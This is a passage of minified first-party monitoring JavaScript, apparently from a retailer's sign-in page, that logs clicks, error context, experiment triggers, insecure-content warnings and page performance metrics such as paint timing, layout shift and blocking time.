(function(c,l,m){function h(a){if(a)try{if(a.id)return"//*[@id='"+a.id+"']";var b,d=1,e;for(e=a.previousSibling;e;e=e.previousSibling)e.nodeName===a.nodeName&&(d+=1);b=d;var c=a.nodeName;1!==b&&(c+="["+b+"]");a.parentNode&&(c=h(a.parentNode)+"/"+c);return c}catch(f){return"DETACHED"}}function f(a){if(a&&a.getAttribute)return a.getAttribute(k)?a.getAttribute(k):f(a.parentElement)}var k="data-cel-widget",g=!1,d=[];(c.ue||{}).isBF=function(){try{var a=JSON.parse(localStorage["csm-bf"]||"[]"),b=0<=a.indexOf(c.ue_id);
a.unshift(c.ue_id);a=a.slice(0,20);localStorage["csm-bf"]=JSON.stringify(a);return b}catch(d){return!1}}();c.ue_utils={getXPath:h,getFirstAscendingWidget:function(a,b){c.ue_cel&&c.ue_fem?!0===g?b(f(a)):d.push({element:a,callback:b}):b()},notifyWidgetsLabeled:function(){if(!1===g){g=!0;for(var a=f,b=0;b<d.length;b++)if(d[b].hasOwnProperty("callback")&&d[b].hasOwnProperty("element")){var c=d[b].callback,e=d[b].element;"function"===typeof c&&"function"===typeof a&&c(a(e))}d=null}},extractStringValue:function(a){if("string"===
typeof a)return a}}})(ue_csm,window,document);





ue_csm.ue_unrt = 1500;
(function(d,b,t){function u(a,g){var c=a.srcElement||a.target||{},b={k:v,t:g.t,dt:g.dt,x:a.pageX,y:a.pageY,p:e.getXPath(c),n:c.nodeName};a.button&&(b.b=a.button);c.type&&(b.ty=c.type);c.href&&(b.r=e.extractStringValue(c.href));c.id&&(b.i=c.id);c.className&&c.className.split&&(b.c=c.className.split(/\s+/));h+=1;e.getFirstAscendingWidget(c,function(a){b.wd=a;d.ue.log(b,r)})}function w(a){if(!x(a.srcElement||a.target)){m+=1;n=!0;var g=f=d.ue.d(),c;p&&"function"===typeof p.now&&a.timeStamp&&(c=p.now()-
a.timeStamp,c=parseFloat(c.toFixed(2)));s=b.setTimeout(function(){u(a,{t:g,dt:c})},y)}}function z(a){if(a){var b=a.filter(A);a.length!==b.length&&(q=!0,k=d.ue.d(),n&&q&&(k&&f&&d.ue.log({k:B,t:f,m:Math.abs(k-f)},r),l(),q=!1,k=0))}}function A(a){if(!a)return!1;var b="characterData"===a.type?a.target.parentElement:a.target;if(!b||!b.hasAttributes||!b.attributes)return!1;var c={"class":"gw-clock gw-clock-aria s-item-container-height-auto feed-carousel using-mouse kfs-inner-container".split(" "),id:["dealClock",
"deal_expiry_timer","timer"],role:["timer"]},d=!1;Object.keys(c).forEach(function(a){var e=b.attributes[a]?b.attributes[a].value:"";(c[a]||"").forEach(function(a){-1!==e.indexOf(a)&&(d=!0)})});return d}function x(a){if(!a)return!1;var b=(e.extractStringValue(a.nodeName)||"").toLowerCase(),c=(e.extractStringValue(a.type)||"").toLowerCase(),d=(e.extractStringValue(a.href)||"").toLowerCase();a=(e.extractStringValue(a.id)||"").toLowerCase();var f="checkbox color date datetime-local email file month number password radio range reset search tel text time url week".split(" ");
if(-1!==["select","textarea","html"].indexOf(b)||"input"===b&&-1!==f.indexOf(c)||"a"===b&&-1!==d.indexOf("http")||-1!==["sitbreaderrightpageturner","sitbreaderleftpageturner","sitbreaderpagecontainer"].indexOf(a))return!0}function l(){n=!1;f=0;b.clearTimeout(s)}function C(){b.ue.onunload(function(){ue.count("armored-cxguardrails.unresponsive-clicks.violations",h);ue.count("armored-cxguardrails.unresponsive-clicks.violationRate",h/m*100||0)})}if(b.MutationObserver&&b.addEventListener&&Object.keys&&
d&&d.ue&&d.ue.log&&d.ue_unrt&&d.ue_utils){var y=d.ue_unrt,r="cel",v="unr_mcm",B="res_mcm",p=b.performance,e=d.ue_utils,n=!1,f=0,s=0,q=!1,k=0,h=0,m=0;b.addEventListener&&(b.addEventListener("mousedown",w,!0),b.addEventListener("beforeunload",l,!0),b.addEventListener("visibilitychange",l,!0),b.addEventListener("pagehide",l,!0));b.ue&&b.ue.event&&b.ue.onSushiUnload&&b.ue.onunload&&C();(new MutationObserver(z)).observe(t,{childList:!0,attributes:!0,characterData:!0,subtree:!0})}})(ue_csm,window,document);


ue_csm.ue.exec(function(g,e){if(e.ue_err){var f="";e.ue_err.errorHandlers||(e.ue_err.errorHandlers=[]);e.ue_err.errorHandlers.push({name:"fctx",handler:function(a){if(!a.logLevel||"FATAL"===a.logLevel)if(f=g.getElementsByTagName("html")[0].innerHTML){var b=f.indexOf("var ue_t0=ue_t0||+new Date();");if(-1!==b){var b=f.substr(0,b).split(String.fromCharCode(10)),d=Math.max(b.length-10-1,0),b=b.slice(d,b.length-1);a.fcsmln=d+b.length+1;a.cinfo=a.cinfo||{};for(var c=0;c<b.length;c++)a.cinfo[d+c+1+""]=
b[c]}b=f.split(String.fromCharCode(10));a.cinfo=a.cinfo||{};if(!(a.f||void 0===a.l||a.l in a.cinfo))for(c=+a.l-1,d=Math.max(c-5,0),c=Math.min(c+5,b.length-1);d<=c;d++)a.cinfo[d+1+""]=b[d]}}})}},"fatals-context")(document,window);


(function(m,b){function c(k){function f(a){a&&"string"===typeof a&&(a=(a=a.match(/^(?:https?:)?\/\/(.*?)(\/|$)/i))&&1<a.length?a[1]:null,a&&a&&("number"===typeof e[a]?e[a]++:e[a]=1))}function d(a){var e=10,d=+new Date;a&&a.timeRemaining?e=a.timeRemaining():a={timeRemaining:function(){return Math.max(0,e-(+new Date-d))}};for(var c=b.performance.getEntries(),k=e;g<c.length&&k>n;)c[g].name&&f(c[g].name),g++,k=a.timeRemaining();g>=c.length?h(!0):l()}function h(a){if(!a){a=m.scripts;var c;if(a)for(var d=
0;d<a.length;d++)(c=a[d].getAttribute("src"))&&"undefined"!==c&&f(c)}0<Object.keys(e).length&&(p&&ue_csm.ue&&ue_csm.ue.event&&(a={domains:e,pageType:b.ue_pty||null,subPageType:b.ue_spty||null,pageTypeId:b.ue_pti||null},ue_csm.ue_sjslob&&(a.lob=ue_csm.ue_lob||"0"),ue_csm.ue.event(a,"csm","csm.CrossOriginDomains.2")),b.ue_ext=e)}function l(){!0===k?d():b.requestIdleCallback?b.requestIdleCallback(d):b.requestAnimationFrame?b.requestAnimationFrame(d):b.setTimeout(d,100)}function c(){if(b.performance&&
b.performance.getEntries){var a=b.performance.getEntries();!a||0>=a.length?h(!1):l()}else h(!1)}var e=b.ue_ext||{};b.ue_ext||c();return e}function q(){setTimeout(c,r)}var s=b.ue_dserr||!1,p=!0,n=1,r=2E3,g=0;b.ue_err&&s&&(b.ue_err.errorHandlers||(b.ue_err.errorHandlers=[]),b.ue_err.errorHandlers.push({name:"ext",handler:function(b){if(!b.logLevel||"FATAL"===b.logLevel){var f=c(!0),d=[],h;for(h in f){var f=h,g=f.match(/amazon(\.com?)?\.\w{2,3}$/i);g&&1<g.length||-1!==f.indexOf("amazon-adsystem.com")||
-1!==f.indexOf("amazonpay.com")||-1!==f.indexOf("cloudfront-labs.amazonaws.com")||d.push(h)}b.ext=d}}}));b.ue&&b.ue.isl?c():b.ue&&ue.attach&&ue.attach("load",q)})(document,window);





var ue_wtc_c = 3;
ue_csm.ue.exec(function(b,e){function l(){for(var a=0;a<f.length;a++)a:for(var d=s.replace(A,f[a])+g[f[a]]+t,c=arguments,b=0;b<c.length;b++)try{c[b].send(d);break a}catch(e){}g={};f=[];n=0;k=p}function u(){B?l(q):l(C,q)}function v(a,m,c){r++;if(r>w)d.count&&1==r-w&&(d.count("WeblabTriggerThresholdReached",1),b.ue_int&&console.error("Number of max call reached. Data will no longer be send"));else{var h=c||{};h&&-1<h.constructor.toString().indexOf(D)&&a&&-1<a.constructor.toString().indexOf(x)&&m&&-1<
m.constructor.toString().indexOf(x)?(h=b.ue_id,c&&c.rid&&(h=c.rid),c=h,a=encodeURIComponent(",wl="+a+"/"+m),2E3>a.length+p?(2E3<k+a.length&&u(),void 0===g[c]&&(g[c]="",f.push(c)),g[c]+=a,k+=a.length,n||(n=e.setTimeout(u,E))):b.ue_int&&console.error("Invalid API call. The input provided is over 2000 chars.")):d.count&&(d.count("WeblabTriggerImproperAPICall",1),b.ue_int&&console.error("Invalid API call. The input provided does not match the API protocol i.e ue.trigger(String, String, Object)."))}}function F(){d.trigger&&
d.trigger.isStub&&d.trigger.replay(function(a){v.apply(this,a)})}function y(){z||(f.length&&l(q),z=!0)}var t=":1234",s="//"+b.ue_furl+"/1/remote-weblab-triggers/1/OE/"+b.ue_mid+":"+b.ue_sid+":PLCHLDR_RID$s:wl-client-id%3DCSMTriger",A="PLCHLDR_RID",E=b.wtt||1E4,p=s.length+t.length,w=b.mwtc||2E3,G=1===e.ue_wtc_c,B=3===e.ue_wtc_c,H=e.XMLHttpRequest&&"withCredentials"in new e.XMLHttpRequest,x="String",D="Object",d=b.ue,g={},f=[],k=p,n,z=!1,r=0,C=function(){return{send:function(a){if(H){var b=new e.XMLHttpRequest;
b.open("GET",a,!0);G&&(b.withCredentials=!0);b.send()}else throw"";}}}(),q=function(){return{send:function(a){(new Image).src=a}}}();e.encodeURIComponent&&(d.attach&&(d.attach("beforeunload",y),d.attach("pagehide",y)),F(),d.trigger=v)},"client-wbl-trg")(ue_csm,window);


(function(k,d,h){function f(a,c,b){a&&a.indexOf&&0===a.indexOf("http")&&0!==a.indexOf("https")&&l(s,c,a,b)}function g(a,c,b){a&&a.indexOf&&(location.href.split("#")[0]!=a&&null!==a&&"undefined"!==typeof a||l(t,c,a,b))}function l(a,c,b,e){m[b]||(e=u&&e?n(e):"N/A",d.ueLogError&&d.ueLogError({message:a+c+" : "+b,logLevel:v,stack:"N/A"},{attribution:e}),m[b]=1,p++)}function e(a,c){if(a&&c)for(var b=0;b<a.length;b++)try{c(a[b])}catch(d){}}function q(){return d.performance&&d.performance.getEntriesByType?
d.performance.getEntriesByType("resource"):[]}function n(a){if(a.id)return"//*[@id='"+a.id+"']";var c;c=1;var b;for(b=a.previousSibling;b;b=b.previousSibling)b.nodeName==a.nodeName&&(c+=1);b=a.nodeName;1!=c&&(b+="["+c+"]");a.parentNode&&(b=n(a.parentNode)+"/"+b);return b}function w(){var a=h.images;a&&a.length&&e(a,function(a){var b=a.getAttribute("src");f(b,"img",a);g(b,"img",a)})}function x(){var a=h.scripts;a&&a.length&&e(a,function(a){var b=a.getAttribute("src");f(b,"script",a);g(b,"script",a)})}
function y(){var a=h.styleSheets;a&&a.length&&e(a,function(a){if(a=a.ownerNode){var b=a.getAttribute("href");f(b,"style",a);g(b,"style",a)}})}function z(){if(A){var a=q();e(a,function(a){f(a.name,a.initiatorType)})}}function B(){e(q(),function(a){g(a.name,a.initiatorType)})}function r(){var a;a=d.location&&d.location.protocol?d.location.protocol:void 0;"https:"==a&&(z(),w(),x(),y(),B(),p<C&&setTimeout(r,D))}var s="[CSM] Insecure content detected ",t="[CSM] Ajax request to same page detected ",v="WARN",
m={},p=0,D=k.ue_nsip||1E3,C=5,A=1==k.ue_urt,u=!0;ue_csm.ue_disableNonSecure||(d.performance&&d.performance.setResourceTimingBufferSize&&d.performance.setResourceTimingBufferSize(300),r())})(ue_csm,window,document);


var ue_aa_a = "";
if (ue.trigger && (ue_aa_a === "C" || ue_aa_a === "T1")) {
    ue.trigger("UEDATA_AA_SERVERSIDE_ASSIGNMENT_CLIENTSIDE_TRIGGER_190249", ue_aa_a);
}
(function(f,b){function g(){try{b.PerformanceObserver&&"function"===typeof b.PerformanceObserver&&(a=new b.PerformanceObserver(function(b){c(b.getEntries())}),a.observe(d))}catch(h){k()}}function m(){for(var h=d.entryTypes,a=0;a<h.length;a++)c(b.performance.getEntriesByType(h[a]))}function c(a){if(a&&Array.isArray(a)){for(var c=0,e=0;e<a.length;e++){var d=l.indexOf(a[e].name);if(-1!==d){var g=Math.round(b.performance.timing.navigationStart+a[e].startTime);f.uet(n[d],void 0,void 0,g);c++}}l.length===
c&&k()}}function k(){a&&a.disconnect&&"function"===typeof a.disconnect&&a.disconnect()}if("function"===typeof f.uet&&b.performance&&"object"===typeof b.performance&&b.performance.getEntriesByType&&"function"===typeof b.performance.getEntriesByType&&b.performance.timing&&"object"===typeof b.performance.timing&&"number"===typeof b.performance.timing.navigationStart){var d={entryTypes:["paint"]},l=["first-paint","first-contentful-paint"],n=["fp","fcp"],a;try{m(),g()}catch(p){f.ueLogError(p,{logLevel:"ERROR",
attribution:"performanceMetrics"})}}})(ue_csm,window);


if (window.csa) {
    csa("Events")("setEntity", {
        page:{pageType: "AuthenticationPortal", subPageType: "SignInClaimCollect", pageTypeId: ""}
    });
}
csa.plugin(function(c){var m="transitionStart",n="pageVisible",e="PageTiming",t="visibilitychange",s="$latency.visible",i=c.global,r=(i.performance||{}).timing,a=["navigationStart","unloadEventStart","unloadEventEnd","redirectStart","redirectEnd","fetchStart","domainLookupStart","domainLookupEnd","connectStart","connectEnd","secureConnectionStart","requestStart","responseStart","responseEnd","domLoading","domInteractive","domContentLoadedEventStart","domContentLoadedEventEnd","domComplete","loadEventStart","loadEventEnd"],u=c.config,o=i.Math,l=o.max,g=o.floor,d=i.document||{},f=(r||{}).navigationStart,v=f,p=0,S=null;if(i.Object.keys&&[].forEach&&!u["KillSwitch."+e]){if(!r||null===f||f<=0||void 0===f)return c.error("Invalid navigation timing data: "+f);S=new E({schemaId:"<ns>.PageLatency.6",producerId:"csa"}),"boolean"!=typeof d.hidden&&"string"!=typeof d.visibilityState||!d.removeEventListener?c.emit(s):b()?(c.emit(s),I(n,f)):c.on(d,t,function e(){b()&&(v=c.time(),d.removeEventListener(t,e),I(m,v),I(n,v),c.emit(s))}),c.once("$unload",h),c.once("$load",h),c.on("$pageTransition",function(){v=c.time()}),c.register(e,{mark:I,instance:function(e){return new E(e)}})}function E(e){var i,r=null,a=e.ent||{page:["pageType","subPageType","requestId"]},o=e.logger||c("Events",{producerId:e.producerId,lob:u.lob||"0"});if(!e||!e.producerId||!e.schemaId)return c.error("The producer id and schema Id must be defined for PageLatencyInstance.");function d(){return i||v}function n(){r=c.UUID()}this.mark=function(n,t){if(null!=n)return t=t||c.time(),n===m&&(i=t),c.once(s,function(){o("log",{messageId:r,__merge:function(e){e.markers[n]=function(e,n){return l(0,n-(e||v))}(d(),t),e.markerTimestamps[n]=g(t)},markers:{},markerTimestamps:{},navigationStartTimestamp:d()?new Date(d()).toISOString():null,schemaId:e.schemaId},{ent:a})}),t},n(),c.on("$beforePageTransition",n)}function I(e,n){e===m&&(v=n);var t=S.mark(e,n);c.emit("$timing:"+e,t)}function h(){if(!p){for(var e=0;e<a.length;e++)r[a[e]]&&I(a[e],r[a[e]]);p=1}}function b(){return!d.hidden||"visible"===d.visibilityState}});csa.plugin(function(u){var f,c,l="length",a="parentElement",t="target",i="getEntriesByName",e="perf",n=null,r="_csa_flt",o="_csa_llt",s="previousSibling",d="visuallyLoaded",g="client",h="offset",m="scroll",p="Width",v="Height",y=g+p,E=g+v,S=h+p,b=h+v,x=m+p,O=m+v,_="_osrc",w="_elt",L="_eid",T=10,I=5,N=15,k=100,B=u.global,H=u.timeout,W=B.Math,Y=W.max,C=W.floor,F=W.ceil,M=B.document||{},R=M.body||{},V=M.documentElement||{},$=B.performance||{},P=($.timing||{}).navigationStart,X=Date.now,D=Object.values||(u.types||{}).ovl,J=u("PageTiming"),j=u("SpeedIndexBuffers"),q=[],Q=[],U=[],z=[],A=[],G=[],K=.1,Z=.1,ee=0,ne=0,te=!0,ie=0,re=0,oe=1==u.config["SpeedIndex.ForceReplay"],ae=0,fe=1,ue=0,ce={},le=[],se=0,de={buffered:1};function ge(e){u.global.ue_csa_ss_tag||u.emit("$csmTag:"+e,0,de)}function he(){for(var e=X(),n=0;f;){if(0!==f[l]){if(!1!==f.h(f[0])&&f.shift(),n++,!oe&&n%T==0&&X()-e>I)break}else f=f.n}ee=0,f&&(ee||(!0===M.hidden?(oe=1,he()):u.timeout(he,0)))}function me(e,n,t,i,r){ue=C(e),q=n,Q=t,U=i,G=r;var o=M.createTreeWalker(M.body,NodeFilter.SHOW_TEXT,null,null),a={w:B.innerWidth,h:B.innerHeight,x:B.pageXOffset,y:B.pageYOffset};M.body[w]=e,z.push({w:o,vp:a}),A.push({img:M.images,iter:0}),q.h=pe,(q.n=Q).h=ve,(Q.n=U).h=ye,(U.n=z).h=Ee,(z.n=A).h=Se,(A.n=G).h=be,f=q,he()}function pe(e){e.m.forEach(function(e){for(var n=e;n&&(e===n||!n[r]||!n[o]);)n[r]||(n[r]=e[r]),n[o]||(n[o]=e[o]),n[w]=n[r]-P,n=n[s]})}function ve(e){e.m.forEach(function(e){var n=e[t];_ in n||(n[_]=e.oldValue)})}function ye(n){n.m.forEach(function(e){e[t][w]=n.t-P})}function Ee(e){for(var n,t=e.vp,i=e.w,r=T;(n=i.nextNode())&&0<r;){r-=1;var o=(n[a]||{}).nodeName;"SCRIPT"!==o&&"STYLE"!==o&&"NOSCRIPT"!==o&&"BODY"!==o&&0!==(n.nodeValue||"").trim()[l]&&Le(n[a],xe(n),t)}return!n}function Se(e){for(var n={w:B.innerWidth,h:B.innerHeight,x:B.pageXOffset,y:B.pageYOffset},t=T;e.iter<e.img[l]&&0<t;){var i,r=e.img[e.iter],o=we(r),a=o&&xe(o)||xe(r);o?(o[w]=a,i=_e(o.querySelector('[aria-posinset="1"] img')||r)||a,r=o):i=_e(r)||a,re&&c<i&&(i=a),Le(r,i,n),e.iter+=1,t-=1}return e.img[l]<=e.iter}function be(e){var n=[],i=0,r=0,o=ne,t=B.innerHeight||Y(R[O]||0,R[b]||0,V[E]||0,V[O]||0,V[b]||0),a=C(e.y/k),f=F((e.y+t)/k);le.slice(a,f).forEach(function(e){(e.elems||[]).forEach(function(e){e.lt in n||(n[e.lt]={}),e.id in n[e.lt]||(i+=(n[e.lt][e.id]=e).a)})}),ge("startVL"),D(n).forEach(function(e){D(e).forEach(function(e){var n=1-r/i,t=Y(e.lt,o);se+=n*(t-o),o=t,function(e,n){var t;for(;K<=1&&K-.01<=e;)Te(d+(t=(100*K).toFixed(0)),n.lt),"50"!==t&&"90"!==t||u("Content",{target:n.e})("mark",d+t,P+F(n.lt||0)),K+=Z}((r+=e.a)/i,e)})}),ge("endVL"),ne=e.t-P,G[l]<=1&&(Te("speedIndex",se),Te(d+"0",ue)),te&&(te=!1,Te("atfSpeedIndex",se))}function xe(e){for(var n=e[a],t=N;n&&0<t;){if(n[w]||0===n[w])return Y(n[w],ue);n=n.parentElement,t-=1}}function Oe(e,n){if(e){if(!e.indexOf("data:"))return xe(n);var t=$[i](e)||[];if(0<t[l])return Y(F(t[0].responseEnd||0),ue)}}function _e(e){return Oe(e[_],e)||Oe(e.currentSrc,e)||Oe(e.src,e)}function we(e){for(var n=10,t=e.parentElement;t&&0<n;){if(t.classList&&t.classList.contains("a-carousel-viewport"))return t;t=t.parentElement,n-=1}return null}function Le(e,n,t){if((n||0===n)&&!e[L]){var i=e.getBoundingClientRect(),r=i.width*i.height,o=t.w||Y(R[x]||0,R[S]||0,V[y]||0,V[x]||0,V[S]||0)||i.right,a=i.width/2,f=fe++;if(0!=r&&!(a<i.right-o||i.right<a)){for(var u={e:e,lt:n,a:r,id:f},c=C((i.top+t.y)/k),l=F((i.top+t.y+i.height)/k),s=c;s<=l;s++)s in le||(le[s]={elems:[],lt:0}),le[s].elems.push(u);e[L]=f}}}function Te(e,n){J("mark",e,P+F((ce[e]=n)||0))}function Ie(e){ae||(ge("browserQuite"+e),j("getBuffers",me),ae=1)}P&&D&&$[i]?(ge(e+"Yes"),j("registerListener",function(){re&&(clearTimeout(ie),ie=H(Ie.bind(n,"Mut"),2500))}),u.once("$unload",function(){oe=1,Ie("Ud")}),u.once("$load",function(){re=1,c=X()-P,ie=H(Ie.bind(n,"Ld"),2500)}),u.once("$timing:functional",Ie.bind(n,"Fn")),j("replayModuleIsLive"),u.register("SpeedIndex",{getMarkers:function(e){e&&e(JSON.parse(JSON.stringify(ce)))}})):ge(e+"No")});csa.plugin(function(e){var m=!!e.config["LCP.elementDedup"],t=!1,n=e("PageTiming"),r=e.global.PerformanceObserver,a=e.global.performance;function i(){return a.timing.navigationStart}function o(){t||function(o){var l=new r(function(e){var t=e.getEntries();if(0!==t.length){var n=t[t.length-1];if(m&&""!==n.id&&n.element&&"IMG"===n.element.tagName){for(var r={},a=t[0],i=0;i<t.length;i++)t[i].id in r||(""!==t[i].id&&(r[t[i].id]=!0),a.startTime<t[i].startTime&&(a=t[i]));n=a}l.disconnect(),o({startTime:n.startTime,renderTime:n.renderTime,loadTime:n.loadTime})}});try{l.observe({type:"largest-contentful-paint",buffered:!0})}catch(e){}}(function(e){e&&(t=!0,n("mark","largestContentfulPaint",Math.floor(e.startTime+i())),e.renderTime&&n("mark","largestContentfulPaint.render",Math.floor(e.renderTime+i())),e.loadTime&&n("mark","largestContentfulPaint.load",Math.floor(e.loadTime+i())))})}r&&a&&a.timing&&(e.once("$unload",o),e.once("$load",o),e.register("LargestContentfulPaint",{}))});csa.plugin(function(r){var e=r("Metrics",{producerId:"csa"}),n=r.global.PerformanceObserver;n&&(n=new n(function(r){var t=r.getEntries();if(0===t.length||!t[0].processingStart||!t[0].startTime)return;!function(r){r=r||0,n.disconnect(),0<=r?e("recordMetric","firstInputDelay",r):e("recordMetric","firstInputDelay.invalid",1)}(t[0].processingStart-t[0].startTime)}),function(){try{n.observe({type:"first-input",buffered:!0})}catch(r){}}())});csa.plugin(function(d){var e="Metrics",g=d.config,f=0;function r(i){var c,t,e=i.producerId,r=i.logger,o=r||d("Events",{producerId:e,lob:g.lob||"0"}),s=(i||{}).dimensions||{},u={},n=-1;if(!e&&!r)return d.error("Either a producer id or custom logger must be defined");function a(){n!==f&&(c=d.UUID(),t=d.UUID(),u={},n=f)}this.recordMetric=function(r,n){var e=i.logOptions||{ent:{page:["pageType","subPageType","requestId"]}};e.debugMetric=i.debugMetric,a(),o("log",{messageId:c,schemaId:i.schemaId||"<ns>.Metric.4",metrics:{},dimensions:s,__merge:function(e){e.metrics[r]=n}},e)},this.recordCounter=function(r,e){var n=i.logOptions||{ent:{page:["pageType","subPageType","requestId"]}};if("string"!=typeof r||"number"!=typeof e||!isFinite(e))return d.error("Invalid type given for counter name or counter value: "+r+"/"+e);a(),r in u||(u[r]={});var c=u[r];"f"in c||(c.f=e),c.c=(c.c||0)+1,c.s=(c.s||0)+e,c.l=e,o("log",{messageId:t,schemaId:i.schemaId||"<ns>.InternalCounters.3",c:{},__merge:function(e){r in e.c||(e.c[r]={}),c.fs||(c.fs=1,e.c[r].f=c.f),1<c.c&&(e.c[r].s=c.s,e.c[r].l=c.l,e.c[r].c=c.c)}},n)}}g["KillSwitch."+e]||(new r({producerId:"csa"}).recordMetric("baselineMetricEvent",1),d.on("$beforePageTransition",function(){f++}),d.register(e,{instance:function(e){return new r(e||{})}}))});csa.plugin(function(t){var a,n=t.config,r=(t.global.performance||{}).timing,s=(r||{}).navigationStart||t.time();function e(){a=t.UUID()}function i(i){var r=(i=i||{}).producerId,e=i.logger,o=e||t("Events",{producerId:r,lob:n.lob||"0"});if(!r&&!e)return t.error("Either a producer id or custom logger must be defined");this.mark=function(e,r){var n=(void 0===r?t.time():r)-s;o("log",{messageId:a,schemaId:i.schemaId||"<ns>.Timer.1",markers:{},__merge:function(r){r.markers[e]=n}},i.logOptions)}}r&&(e(),t.on("$beforePageTransition",e),t.register("Timers",{instance:function(r){return new i(r||{})}}))});csa.plugin(function(t){var e="takeRecords",i="disconnect",n="function",o=t("Metrics",{producerId:"csa"}),c=t("PageTiming"),a=t.global,u=t.timeout,r=t.on,f=a.PerformanceObserver,m=0,l=!1,s=0,d=a.performance,h=a.document,v=null,y=!1,g=t.blank;function p(){l||(l=!0,clearTimeout(v),typeof f[e]===n&&f[e](),typeof f[i]===n&&f[i](),o("recordMetric","documentCumulativeLayoutShift",m),c("mark","cumulativeLayoutShiftLastTimestamp",Math.floor(s+d.timing.navigationStart)))}f&&d&&d.timing&&h&&(f=new f(function(t){v&&clearTimeout(v);t.getEntries().forEach(function(t){t.hadRecentInput||(m+=t.value,s<t.startTime&&(s=t.startTime))}),v=u(p,5e3)}),function(){try{f.observe({type:"layout-shift",buffered:!0}),v=u(p,5e3)}catch(t){}}(),g=r(h,"click",function(t){y||(y=!0,o("recordMetric","documentCumulativeLayoutShiftToFirstInput",m),g())}),r(h,"visibilitychange",function(){"hidden"===h.visibilityState&&p()}),t.once("$unload",p))});csa.plugin(function(e){var t,n=e.global,r=n.PerformanceObserver,c=e("Metrics",{producerId:"csa"}),o=0,i=0,a=-1,l=n.Math,f=l.max,u=l.ceil;if(r){t=new r(function(e){e.getEntries().forEach(function(e){var t=e.duration;o+=t,i+=t,a=f(t,a)})});try{t.observe({type:"longtask",buffered:!0})}catch(e){}t=new r(function(e){0<e.getEntries().length&&(i=0,a=-1)});try{t.observe({type:"largest-contentful-paint",buffered:!0})}catch(e){}e.on("$unload",g),e.on("$beforePageTransition",g)}function g(){c("recordMetric","totalBlockingTime",u(i||0)),c("recordMetric","totalBlockingTimeInclLCP",u(o||0)),c("recordMetric","maxBlockingTime",u(a||0)),i=o=0,a=-1}});csa.plugin(function(o){var e="CacheDetection",r="csa-ctoken-",n=o.store,t=o.deleteStored,c=o.config,a=c[e+".RequestID"],i=c[e+".Callback"],s=o.global,u=s.document||{},d=s.Date,l=o("Events"),f=o("Events",{producerId:"csa",lob:c.lob||"0"});function p(e){try{var n=u.cookie.match(RegExp("(^| )"+e+"=([^;]+)"));return n&&n[2].trim()}catch(e){}}!function(){var e=function(){var e=p("cdn-rid");if(e)return{r:e,s:"cdn"}}()||function(){if(o.store(r+a))return{r:o.UUID().toUpperCase().replace(/-/g,"").slice(0,20),s:"device"}}()||{},n=e.r,c=e.s;if(!!n){var t=p("session-id");!function(e,n,c,t){l("setEntity",{page:{pageSource:"cache",requestId:e,cacheRequestId:a,cacheSource:t},session:{id:c}})}(n,0,t,c),"device"===c&&f("log",{schemaId:"<ns>.CacheImpression.2"},{ent:"all"}),i&&i(n,t,c)}}(),n(r+a,d.now()+36e5),o.once("$load",function(){var c=d.now();t(function(e,n){return 0==e.indexOf(r)&&parseInt(n)<c})})});csa.plugin(function(u){var i,t="Content",e="MutationObserver",n="addedNodes",a="querySelectorAll",f="matches",r="getAttributeNames",o="getAttribute",s="dataset",c="widget",l="producerId",d="slotId",h="iSlotId",g={ent:{element:1,page:["pageType","subPageType","requestId"]}},p=5,m=u.config[t+".BubbleUp.SearchDepth"]||35,y=u.config[t+".SearchPage"]||0,v="csaC",b=v+"Id",E="logRender",w={},I=u.config,O=I[t+".Selectors"]||[],C=I[t+".WhitelistedAttributes"]||{href:1,class:1},N=I[t+".EnableContentEntities"],S=I["KillSwitch.ContentRendered"],k=u.global,A=k.document||{},U=A.documentElement,L=k.HTMLElement,R={},_=[],j=function(t,e,n,i){var o=this,r=u("Events",{producerId:t||"csa",lob:I.lob||"0"});e.type=e.type||c,o.id=e.id,o.l=r,o.e=e,o.el=n,o.rt=i,o.dlo=g,o.op=W(n,"csaOp"),o.log=function(t,e){r("log",t,e||g)},o.entities=function(t){t(e)},e.id&&r("setEntity",{element:e})},x=j.prototype;function D(t){var e=(t=t||{}).element,n=t.target;return e?function(t,e){var n;n=t instanceof L?K(t)||Y(e[l],t,z,u.time()):R[t.id]||H(e[l],0,t,u.time());return n}(e,t):n?M(n):u.error("No element or target argument provided.")}function M(t){var e=function(t){var e=null,n=0;for(;t&&n<m;){if(n++,P(t,b)){e=t;break}t=t.parentElement}return e}(t);return e?K(e):new j("csa",{id:null},null,u.time())}function P(t,e){if(t&&t.dataset)return t.dataset[e]}function T(t,e,n){_.push({n:n,e:t,t:e}),B()}function q(){for(var t=u.time(),e=0;0<_.length;){var n=_.shift();if(w[n.n](n.e,n.t),++e%10==0&&u.time()-t>p)break}i=0,_.length&&B()}function B(){i=i||u.raf(q)}function X(t,e,n){return{n:t,e:e,t:n}}function Y(t,e,n,i){var o=u.UUID(),r={id:o},c=M(e);return e[s][b]=o,n(r,e),c&&c.id&&(r.parentId=c.id),H(t,e,r,i)}function $(t){return isNaN(t)?null:Math.round(t)}function H(t,e,n,i){N&&(n.schemaId="<ns>.ContentEntity.2"),n.id=n.id||u.UUID();var o=new j(t,n,e,i);return function(t){return!S&&((t.op||{}).hasOwnProperty(E)||y)}(o)&&function(t,e){var n={},i=u.exec($);t.el&&(n=t.el.getBoundingClientRect()),t.log({schemaId:"<ns>.ContentRender.3",timestamp:e,width:i(n.width),height:i(n.height),positionX:i(n.left+k.pageXOffset),positionY:i(n.top+k.pageYOffset)})}(o,i),u.emit("$content.register",o),R[n.id]=o}function K(t){return R[(t[s]||{})[b]]}function W(n,i){var o={};return r in(n=n||{})&&Object.keys(n[s]).forEach(function(t){if(!t.indexOf(i)&&i.length<t.length){var e=function(t){return(t[0]||"").toLowerCase()+t.slice(1)}(t.slice(i.length));o[e]=n[s][t]}}),o}function z(t,e){r in e&&(function(t,e){var n=W(t,v);Object.keys(n).forEach(function(t){e[t]=n[t]})}(e,t),d in t&&(t[h]=t[d]),function(e,n){(e[r]()||[]).forEach(function(t){t in C&&(n[t]=e[o](t))})}(e,t))}U&&A[a]&&k[e]&&(O.push({selector:"*[data-csa-c-type]",entity:z}),O.push({selector:".celwidget",entity:function(t,e){z(t,e),t[d]=t[d]||e[o]("cel_widget_id")||e.id,t.legacyId=e[o]("cel_widget_id")||e.id,t.type=t.type||c}}),w[1]=function(t,e){t.forEach(function(t){t[n]&&t[n].constructor&&"NodeList"===t[n].constructor.name&&Array.prototype.forEach.call(t[n],function(t){_.unshift(X(2,t,e))})})},w[2]=function(r,c){a in r&&f in r&&O.forEach(function(t){for(var 